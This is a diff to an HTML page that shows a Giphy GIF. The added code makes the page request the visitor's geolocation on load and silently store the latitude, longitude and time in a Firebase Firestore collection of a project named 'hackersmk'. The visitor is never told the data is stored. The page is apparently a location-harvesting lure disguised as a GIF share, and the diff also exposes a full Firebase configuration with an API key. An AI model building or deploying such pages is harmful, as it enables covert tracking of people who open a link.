@@ -1,34 +1,77 @@
 <!DOCTYPE html>
 <html>
 <body onload="getLocation()">
-  <iframe src="https://giphy.com/embed/Mtqip7Jor0DgAvzn6U" width="480" height="456" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/Mtqip7Jor0DgAvzn6U">via GIPHY</a></p>
 
+  <!-- GIF Embed -->
+  <iframe src="https://giphy.com/embed/Mtqip7Jor0DgAvzn6U" width="480" height="456" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
+  <p><a href="https://giphy.com/gifs/Mtqip7Jor0DgAvzn6U">via GIPHY</a></p>
 
+  <p id="demo"></p>
 
+  <!-- Firebase & Firestore setup -->
+  <script type="module">
+    // Import Firebase
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-app.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-firestore.js";
 
+    // Firebase config
+    const firebaseConfig = {
+      apiKey: "AIzaSyD5MF8isLfz7cdD-IQ1VfZu9LIbyY6KYFc",
+      authDomain: "hackersmk-3199b.firebaseapp.com",
+      projectId: "hackersmk-3199b",
+      storageBucket: "hackersmk-3199b.appspot.com",
+      messagingSenderId: "237293330301",
+      appId: "1:237293330301:web:7c39623973360c39097614",
+      measurementId: "G-21JSZZCXWT"
+    };
 
-<p id="demo"></p>
+    // Initialize Firebase and Firestore
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
 
-<script>
-const x = document.getElementById("demo");
+    // Save reference to window so we can access in other script
+    window.saveLocationToFirestore = async function(lat, lng) {
+      try {
+        const docRef = await addDoc(collection(db, "locations"), {
+          latitude: lat,
+          longitude: lng,
+          timestamp: new Date()
+        });
+        console.log("Document written with ID: ", docRef.id);
+      } catch (e) {
+        console.error("Error adding document: ", e);
+      }
+    };
+  </script>
 
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(success, error);
-  } else { 
-    x.innerHTML = "Geolocation is not supported by this browser.";
-  }
-}
+  <!-- Geolocation script -->
+  <script>
+    const x = document.getElementById("demo");
 
-function success(position) {
-  x.innerHTML = "Latitude: " + position.coords.latitude + 
-  "<br>Longitude: " + position.coords.longitude;
-}
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(success, error);
+      } else {
+        x.innerHTML = "Geolocation is not supported by this browser.";
+      }
+    }
 
-function error() {
-  alert("Sorry, no position available.");
-}
-</script>
+    function success(position) {
+      const lat = position.coords.latitude;
+      const lng = position.coords.longitude;
+
+      x.innerHTML = "Latitude: " + lat + "<br>Longitude: " + lng;
+
+      // Call the Firebase Firestore save function
+      if (window.saveLocationToFirestore) {
+        window.saveLocationToFirestore(lat, lng);
+      }
+    }
+
+    function error() {
+      alert("Sorry, no position available.");
+    }
+  </script>
 
 </body>
 </html>
